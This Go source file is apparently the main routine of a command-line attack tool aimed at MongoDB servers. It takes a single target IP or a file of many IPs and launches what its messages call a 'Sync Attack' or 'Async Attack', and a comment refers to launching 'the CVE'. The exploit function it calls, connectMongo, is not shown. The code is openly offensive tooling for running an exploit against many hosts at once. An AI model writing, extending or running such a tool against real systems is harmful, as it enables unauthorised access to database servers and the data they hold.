package main

import (
	"bufio"
	"flag"
	"log"
	"os"
	"regexp"
)

func main() {
	isFile := false
	target := flag.String(
		"t",
		"localhost",
		"Target url to attack",
	)
	flag.Parse()

	var ips []string
	ipv4Regex := `^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4})`
	if match, _ := regexp.MatchString(ipv4Regex, *target); !match {
		isFile = true
		//trying to open file, otherwise mentioning how to launch the CVE
		file, err := os.Open(*target)
		if err != nil {
			log.Println("\n\033[31m Specify target like '-t <target_ip>' or '-t <target_filename>'")
			log.Println("\033[34m" + err.Error())
			os.Exit(0)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)

		for scanner.Scan() {
			ips = append(ips, scanner.Text())
		}
	}

	//checking if the parameter is URL or not
	if !isFile {
		log.Println("\n\033[34m[+] The target is in URL. Starting Sync Attack...")
		ch := make(chan string)
		go connectMongo(*target, ch)
		log.Println(<-ch)
		os.Exit(0)
	} else {
		log.Println("\n\u001B[34m[+] The target is in file. Starting Async Attack...")
		for _, ip := range ips {
			ch := make(chan string)
			go connectMongo(ip, ch)
			log.Println(<-ch)
		}
	}
}
